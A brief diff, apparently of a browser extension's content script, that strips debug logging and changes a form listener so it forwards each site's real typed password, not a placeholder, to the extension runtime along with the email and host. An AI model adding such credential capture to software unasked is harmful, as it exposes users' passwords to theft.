@@ -32,7 +32,6 @@ function equalArrays (array1, array2) {
 }
 
 function listenToForms (){
-    console.log("listen : "+(new Date()).getTime());
     for (var i = 0; i < document.forms.length; i++) {
         var listen = true;
         for (var j = 0; j < allForms.length; j++){
@@ -45,8 +44,6 @@ function listenToForms (){
             listenToSubmit(document.forms[i]);
             listenToClick(document.forms[i]);
             allForms.push(document.forms[i]);
-            console.log("Add form : ");
-            console.log(document.forms[i]);
         }
         
     }
@@ -93,7 +90,7 @@ function checkFields(fields){
              var password = fields[j].value;
         }
         if(hasEmail && hasPassword){
-            extensionLight.runtime.sendMessage('newConnectionToRandomWebsite', {'website':window.location.host, 'username':email, 'password':"???"}, function(){});
+            extensionLight.runtime.sendMessage('newConnectionToRandomWebsite', {'website':window.location.host, 'username':email, 'password':password}, function(){});
         break;
         }
     }
